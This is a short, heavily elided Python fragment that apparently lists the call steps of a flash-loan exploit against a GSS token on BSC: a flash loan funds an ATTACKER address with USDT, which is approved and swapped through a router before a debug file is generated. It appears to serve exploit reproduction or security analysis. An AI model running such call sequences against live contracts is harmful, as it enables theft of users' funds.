...
GSSExp = [
    ...
    # },
    {
        ...
        "caller": FLASHLOAN,
        "target": USDT,
        "name": "transfer", "args": [ATTACKER, int(3000e18)],
    },
    {
        "ty": "abi",
        "caller": ATTACKER,
        "target": USDT,
        "name": "approve", "args": [ROUTER, int(3000e18)],
    },
    {
        "ty": "abi",
        "caller": ATTACKER,
        ...
        "args": [
            int(3000e18), 0, [USDT, GSS], ATTACKER, 1000000000000
        ]
    },
    {
        "ty": "abi",
...
generate_debug_file("bsc", GSSExp)
